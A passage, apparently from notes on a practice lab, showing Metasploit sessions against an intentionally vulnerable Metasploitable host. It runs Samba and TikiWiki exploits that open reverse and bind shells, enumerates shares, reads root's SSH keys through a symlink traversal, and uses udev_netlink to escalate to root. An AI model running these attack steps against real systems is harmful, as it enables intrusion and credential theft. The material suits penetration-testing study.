+   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
+   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
+   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
+   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations
+
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > show options 
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  139              yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(usermap_script) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf exploit(usermap_script) > exploit 
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo mZjqadZ2VWfVQish;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "mZjqadZ2VWfVQish\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.174.137:4444 -> 192.168.174.130:38546) at 2016-01-24 02:36:16 -0500
+
+id
+uid=0(root) gid=0(root)
+pwd
+/
+
+Check for writable shares
+root@kali:~# enum4linux 192.168.174.130
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 24 02:39:31 2016
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.174.130
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+<--- snip --->
+ ============================================ 
+|    Share Enumeration on 192.168.174.130    |
+ ============================================ 
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+
+	Server               Comment
+	---------            -------
+	METASPLOITABLE       metasploitable server (Samba 3.0.20-Debian)
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE
+
+[+] Attempting to map shares on 192.168.174.130
+//192.168.174.130/print$	Mapping: DENIED, Listing: N/A
+//192.168.174.130/tmp	Mapping: OK, Listing: OK
+//192.168.174.130/opt	Mapping: DENIED, Listing: N/A
+//192.168.174.130/IPC$	[E] Can't understand response:
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+//192.168.174.130/ADMIN$	Mapping: DENIED, Listing: N/A
+<--- snip --->
+ ================================================ 
+|    Getting printer info for 192.168.174.130    |
+ ================================================ 
+No printers returned.
+
+
+enum4linux complete on Sun Jan 24 02:39:36 2016
+
+root@kali:~# 
+
+msf > search smb
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                            Disclosure Date  Rank       Description
+   ----                                                            ---------------  ----       -----------
+   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     Microsoft SQL Server NTLM Stealer
+   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     Microsoft SQL Server SQLi NTLM Stealer
+   auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     Oracle SMB Relay Code Execution
+   auxiliary/admin/smb/check_dir_file                                               normal     SMB Scanner Check File/Directory Utility
+   auxiliary/admin/smb/delete_file                                                  normal     SMB File Delete Utility
+   auxiliary/admin/smb/download_file                                                normal     SMB File Download Utility
+   auxiliary/admin/smb/list_directory                                               normal     SMB Directory Listing Utility
+   auxiliary/admin/smb/psexec_command                                               normal     Microsoft Windows Authenticated Administration Utility
+   auxiliary/admin/smb/psexec_ntdsgrab                                              normal     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   auxiliary/admin/smb/samba_symlink_traversal                                      normal     Samba Symlink Directory Traversal
+   auxiliary/admin/smb/upload_file                                                  normal     SMB File Upload Utility
+   auxiliary/docx/word_unc_injector                                                 normal     Microsoft Word UNC Path Injector
+   auxiliary/dos/samba/read_nttrans_ea_list                                         normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     SAP SOAP EPS_DELETE_FILE File Deletion
+   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     Microsoft Plug and Play Service Registry Overflow
+   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     Microsoft SRV.SYS Mailslot Write Corruption
+   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     Microsoft SRV.SYS Pipe Transaction No Null
+   auxiliary/dos/windows/smb/ms09_001_write                                         normal     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
+   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
+   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     Microsoft Windows Browser Pool DoS
+   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     Microsoft Vista SP0 SMB Negotiate Protocol DoS
+   auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal     SMB Negotiate SMB2 Dialect Corruption
+   auxiliary/fuzzers/smb/smb_create_pipe                                            normal     SMB Create Pipe Request Fuzzer
+   auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal     SMB Create Pipe Request Corruption
+   auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal     SMB Negotiate Dialect Corruption
+   auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal     SMB NTLMv1 Login Request Corruption
+   auxiliary/fuzzers/smb/smb_tree_connect                                           normal     SMB Tree Connect Request Fuzzer
+   auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal     SMB Tree Connect Request Corruption
+   auxiliary/gather/konica_minolta_pwd_extract                                      normal     Konica Minolta Password Extractor
+   auxiliary/scanner/sap/sap_smb_relay                                              normal     SAP SMB Relay Abuse
+   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   auxiliary/scanner/smb/pipe_auditor                                               normal     SMB Session Pipe Auditor
+   auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal     SMB Session Pipe DCERPC Auditor
+   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     Microsoft Windows Authenticated Logged In Users Enumeration
+   auxiliary/scanner/smb/smb2                                                       normal     SMB 2.0 Protocol Detection
+   auxiliary/scanner/smb/smb_enumshares                                             normal     SMB Share Enumeration
+   auxiliary/scanner/smb/smb_enumusers                                              normal     SMB User Enumeration (SAM EnumUsers)
+   auxiliary/scanner/smb/smb_enumusers_domain                                       normal     SMB Domain User Enumeration
+   auxiliary/scanner/smb/smb_login                                                  normal     SMB Login Check Scanner
+   auxiliary/scanner/smb/smb_lookupsid                                              normal     SMB SID User Enumeration (LookupSid)
+   auxiliary/scanner/smb/smb_version                                                normal     SMB Version Detection
+   auxiliary/scanner/snmp/snmp_enumshares                                           normal     SNMP Windows SMB Share Enumeration
+   auxiliary/server/capture/smb                                                     normal     Authentication Capture: SMB
+   auxiliary/server/http_ntlmrelay                                                  normal     HTTP Client MS Credential Relayer
+   auxiliary/spoof/nbns/nbns_response                                               normal     NetBIOS Name Service Spoofer
+   exploit/linux/samba/chain_reply                                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   exploit/netware/smb/lsass_cifs                                  2007-01-21       average    Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     Apple Safari file:// Arbitrary Code Execution
+   exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       excellent  Sun Java Web Start Plugin Command Line Argument Injection
+   exploit/windows/browser/java_ws_double_quote                    2012-10-16       excellent  Sun Java Web Start Double Quote Injection
+   exploit/windows/browser/java_ws_vmargs                          2012-02-14       excellent  Sun Java Web Start Plugin Command Line Argument Injection
+   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       great      MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       excellent  MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
+   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       URSoft W32Dasm Disassembler Function Buffer Overflow
+   exploit/windows/fileformat/vlc_smb_uri                          2009-06-24       great      VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
+   exploit/windows/http/generic_http_dll_injection                 2015-03-04       manual     Generic Web Application DLL Injection
+   exploit/windows/misc/hp_dataprotector_cmd_exec                  2014-11-02       excellent  HP Data Protector 8.10 Remote Command Execution
+   exploit/windows/oracle/extjob                                   2007-01-01       excellent  Oracle Job Scheduler Named Pipe Command Execution
+   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       excellent  GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   exploit/windows/smb/generic_smb_dll_injection                   2015-03-04       manual     Generic DLL Injection From Shared Resource
+   exploit/windows/smb/ms03_049_netapi                             2003-11-11       good       MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   exploit/windows/smb/ms04_007_killbill                           2004-02-10       low        MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   exploit/windows/smb/ms04_011_lsass                              2004-04-13       good       MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   exploit/windows/smb/ms04_031_netdde                             2004-10-12       good       MS04-031 Microsoft NetDDE Service Overflow
+   exploit/windows/smb/ms05_039_pnp                                2005-08-09       good       MS05-039 Microsoft Plug and Play Service Overflow
+   exploit/windows/smb/ms06_025_rasmans_reg                        2006-06-13       good       MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   exploit/windows/smb/ms06_025_rras                               2006-06-13       average    MS06-025 Microsoft RRAS Service Overflow
+   exploit/windows/smb/ms06_040_netapi                             2006-08-08       good       MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/smb/ms06_066_nwapi                              2006-11-14       good       MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   exploit/windows/smb/ms06_066_nwwks                              2006-11-14       good       MS06-066 Microsoft Services nwwks.dll Module Exploit
+   exploit/windows/smb/ms06_070_wkssvc                             2006-11-14       manual     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   exploit/windows/smb/ms07_029_msdns_zonename                     2007-04-12       manual     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
+   exploit/windows/smb/ms08_067_netapi                             2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   exploit/windows/smb/ms09_050_smb2_negotiate_func_index          2009-09-07       good       MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   exploit/windows/smb/ms10_061_spoolss                            2010-09-14       excellent  MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   exploit/windows/smb/netidentity_xtierrpcpipe                    2009-04-06       great      Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   exploit/windows/smb/psexec                                      1999-01-01       manual     Microsoft Windows Authenticated User Code Execution
+   exploit/windows/smb/psexec_psh                                  1999-01-01       manual     Microsoft Windows Authenticated Powershell Command Execution
+   exploit/windows/smb/smb_relay                                   2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution
+   exploit/windows/smb/timbuktu_plughntcommand_bof                 2009-06-25       great      Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+   post/linux/gather/mount_cifs_creds                                               normal     Linux Gather Saved mount.cifs/mount.smbfs Credentials
+   post/windows/escalate/droplnk                                                    normal     Windows Escalate SMB Icon LNK Dropper
+   post/windows/gather/credentials/gpp                                              normal     Windows Gather Group Policy Preference Saved Passwords
+   post/windows/gather/enum_shares                                                  normal     Windows Gather SMB Share Enumeration via Registry
+   post/windows/gather/netlm_downgrade                                              normal     Windows NetLM Downgrade Attack
+   post/windows/gather/word_unc_injector                                            normal     Windows Gather Microsoft Office Word UNC Path Injector
+
+
+msf > use auxiliary/admin/smb/samba_symlink_traversal
+msf auxiliary(samba_symlink_traversal) > show options 
+
+Module options (auxiliary/admin/smb/samba_symlink_traversal):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOST                       yes       The target address
+   RPORT      445              yes       Set the SMB service port
+   SMBSHARE                    yes       The name of a writeable share on the server
+   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem
+
+msf auxiliary(samba_symlink_traversal) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
+SMBSHARE => tmp
+msf auxiliary(samba_symlink_traversal) > show options 
+
+Module options (auxiliary/admin/smb/samba_symlink_traversal):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOST      192.168.174.130  yes       The target address
+   RPORT      445              yes       Set the SMB service port
+   SMBSHARE   tmp              yes       The name of a writeable share on the server
+   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem
+
+msf auxiliary(samba_symlink_traversal) > exploit 
+
+[*] Connecting to the server...
+[*] Trying to mount writeable share 'tmp'...
+[*] Trying to link 'rootfs' to the root filesystem...
+[*] Now access the following share to browse the root filesystem:
+[*] 	\\192.168.174.130\tmp\rootfs\
+
+[*] Auxiliary module execution completed
+msf auxiliary(samba_symlink_traversal) > 
+
+root@kali:~# smbclient //192.168.174.130/tmp
+Enter root's password: 
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+smb: \> cd rootfs\/root/.ssh/
+smb: \rootfs\root\.ssh\> get authorized_keys 
+getting file \rootfs\root\.ssh\authorized_keys of size 405 as authorized_keys (131.8 KiloBytes/sec) (average 131.8 KiloBytes/sec)
+smb: \rootfs\root\.ssh\> 
+
+root@kali:~# cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+root@kali:~# 
+
+9.) Privilage Escalation for metasploitable
+In msf
+msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec
+msf exploit(tikiwiki_graph_formula_exec) > show options 
+
+Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /tikiwiki        yes       TikiWiki directory path
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/bind_tcp
+payload => php/meterpreter/bind_tcp
+msf exploit(tikiwiki_graph_formula_exec) > exploit 
+
+[*] Started bind handler
+[*] Attempting to obtain database credentials...
+[*] The server returned            : 200 OK
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] TikiWiki database informations : 
+
+db_tiki   : mysql
+dbversion : 1.9
+host_tiki : localhost
+user_tiki : root
+pass_tiki : root
+dbs_tiki  : tikiwiki195
+
+[*] Attempting to execute our payload...
+[*] Sending stage (40499 bytes) to 192.168.174.130
+[*] Meterpreter session 1 opened (192.168.174.137:36163 -> 192.168.174.130:4444) at 2016-01-25 13:30:51 -0500
+
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > background 
+[*] Backgrounding session 1...
+msf exploit(tikiwiki_graph_formula_exec) > back
+msf > sessions -i
+
+Active sessions
+===============
+
+  Id  Type                 Information                     Connection
+  --  ----                 -----------                     ----------
+  1   meterpreter php/php  www-data (33) @ metasploitable  192.168.174.137:36163 -> 192.168.174.130:4444 (192.168.174.130)
+
+msf > use exploit/linux/local/udev_netlink 
+msf exploit(udev_netlink) > show options 
+
+Module options (exploit/linux/local/udev_netlink):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                       yes       The session to run this module on.
+   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf exploit(udev_netlink) > set SESSION 1
+SESSION => 1
+msf exploit(udev_netlink) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Attempting to autodetect netlink pid...
+[*] Meterpreter session, using get_processes to find netlink pid
+[*] udev pid: 3007
+[+] Found netlink pid: 3006
+[*] Writing payload executable (274 bytes) to /tmp/AgAtdYxErv
+[*] Writing exploit executable (1879 bytes) to /tmp/TJqTWaxtzQ
+[*] chmod'ing and running it...
+[*] Command shell session 2 opened (192.168.174.137:4444 -> 192.168.174.130:57236) at 2016-01-25 13:31:49 -0500
+
+id
+uid=0(root) gid=0(root)
+pwd
+/
+whoami
+root
+hostname
+metasploitable
